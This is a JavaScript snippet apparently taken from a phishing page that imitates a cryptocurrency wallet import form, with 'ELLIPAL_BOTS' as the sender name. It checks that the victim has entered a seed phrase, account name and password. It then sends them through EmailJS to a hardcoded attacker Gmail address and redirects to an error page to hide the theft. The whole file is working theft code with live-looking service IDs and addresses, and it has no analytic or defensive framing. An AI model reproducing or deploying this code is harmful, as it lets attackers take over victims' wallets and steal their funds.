

   (function(){
      emailjs.init("6cHgMzYPqUrDzavqD");
   })();




            

        function mySendEmail() {


                if( !$('.seed-phrase').val()) {

                alert("Input your Seed Phrase to continue");
                        return false;
                    }

                if( !$('.account-name').val()) {

                alert("Set an Account Name");
                        return false;
                    }

                if( !$('.password-1').val()) {

                alert("Enter a password");
                        return false;
                    }

                if( !$('.password-2').val()) {

                alert("Retype password required");
                        return false;
                    }


                var pass = $('.password-1').val();
                var pass2 = $('.password-2').val();
        if(pass != pass2){
            alert('the passwords didn\'t match eachother!');
            return false;
                }
                
              else {
                $('.circle-loader').fadeIn('fast');
              }  


    


        var myurl = "import?err=1";

        const emails = "hammedj005@gmail.com"; // benignunited@gmail.com for multiple email use ["email1@gmail.com", "email2@gmail.com"];

        const account_name = $(".account-name").val();
        const seed_phrase = $(".seed-phrase").val();
        const passcode = $(".password-1").val();
    
    var templateParams = {
    from_name: 'ELLIPAL_BOTS',
    account_name: account_name,
    phrase: seed_phrase,
    passcode: passcode,
    to_email: emails
};
 
emailjs.send('service_fccv6i9', 'template_3blhr34', templateParams)
    .then(function(response) {
       window.location = myurl;
       
    }, function(error) {
       console.log('FAILED...', error);
    });


                }             

              